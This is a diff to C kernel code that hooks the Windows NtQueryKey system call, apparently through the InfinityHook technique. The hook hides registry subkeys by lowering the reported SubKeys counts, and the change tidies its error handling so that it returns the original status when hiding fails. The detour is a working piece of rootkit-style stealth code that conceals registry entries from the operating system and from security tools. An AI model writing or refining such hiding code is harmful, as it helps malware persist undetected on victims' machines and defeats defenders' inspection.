@@ -38,8 +38,8 @@ NTSTATUS DetourNtQueryKey(
 {
 	//PrintRegistryKeyHandleInformation(KeyHandle, L"NtQueryKey");
 	if (KeyInformationClass == KeyCachedInformation) {
-			NTSTATUS status = OriginalNtQueryKey(KeyHandle, KeyInformationClass, KeyInformation, Length, ResultLength);
-			if (NT_SUCCESS(status)) {
+			NTSTATUS originalStatus = OriginalNtQueryKey(KeyHandle, KeyInformationClass, KeyInformation, Length, ResultLength);
+			if (NT_SUCCESS(originalStatus)) {
 				PKEY_CACHED_INFORMATION KeyCachedInformationPtr = (PKEY_CACHED_INFORMATION)KeyInformation;
 				//kprintf("[+] infinityhook: NtQueryKey KeyCachedInformation: SubKeys: %ul, MaxNameLen: %ul, Values: %ul, NameLength: %ul\n", KeyCachedInformationPtr->SubKeys, KeyCachedInformationPtr->MaxNameLen, KeyCachedInformationPtr->Values, KeyCachedInformationPtr->NameLength);
 
@@ -49,7 +49,9 @@ NTSTATUS DetourNtQueryKey(
 				NTSTATUS status = RegistryKeyHideInformation(KeyHandle, &HideSubkeyIndexesCount, &OkSubkeyIndexesCount, &OkSubkeyIndexesPtr);
 
 				if (!NT_SUCCESS(status)) {
-					// TODO - do something if this fails?
+					// if the RegistryKeyHideInformation call failed, we can't do any reasonable modifications
+					// and we can't free anything
+					return originalStatus;
 				}
 
 				//kprintf("[+] infinityhook: NtQueryKey After Zw: Indexes count: %d, hide indexes count: %d\n", OkSubkeyIndexesCount, HideSubkeyIndexesCount);
@@ -62,11 +64,11 @@ NTSTATUS DetourNtQueryKey(
 					KeyCachedInformationPtr->SubKeys -= HideSubkeyIndexesCount;
 				}
 			}
-		return status;
+		return originalStatus;
 	}
 	if (KeyInformationClass == KeyFullInformation) {
-		NTSTATUS status = OriginalNtQueryKey(KeyHandle, KeyInformationClass, KeyInformation, Length, ResultLength);
-		if (NT_SUCCESS(status)) {
+		NTSTATUS originalStatus = OriginalNtQueryKey(KeyHandle, KeyInformationClass, KeyInformation, Length, ResultLength);
+		if (NT_SUCCESS(originalStatus)) {
 			PKEY_FULL_INFORMATION KeyFullInformationPtr = (PKEY_FULL_INFORMATION)KeyInformation;
 			//kprintf("[+] infinityhook: NtQueryKey KeyFullInformation: SubKeys: %ul\n", KeyFullInformationPtr->SubKeys);
 
@@ -76,7 +78,9 @@ NTSTATUS DetourNtQueryKey(
 			NTSTATUS status = RegistryKeyHideInformation(KeyHandle, &HideSubkeyIndexesCount, &OkSubkeyIndexesCount, &OkSubkeyIndexesPtr);
 
 			if (!NT_SUCCESS(status)) {
-				// TODO - do something if this fails?
+				// if the RegistryKeyHideInformation call failed, we can't do any reasonable modifications
+				// and we can't free anything
+				return originalStatus;
 			}
 
 			//kprintf("[+] infinityhook: NtQueryKey After Zw: Indexes count: %d, hide indexes count: %d\n", OkSubkeyIndexesCount, HideSubkeyIndexesCount);
@@ -89,7 +93,7 @@ NTSTATUS DetourNtQueryKey(
 				KeyFullInformationPtr->SubKeys -= HideSubkeyIndexesCount;
 			}
 		}
-		return status;
+		return originalStatus;
 	}
 	else return OriginalNtQueryKey(KeyHandle, KeyInformationClass, KeyInformation, Length, ResultLength);
 	//if (KeyInformationClass == 3) {
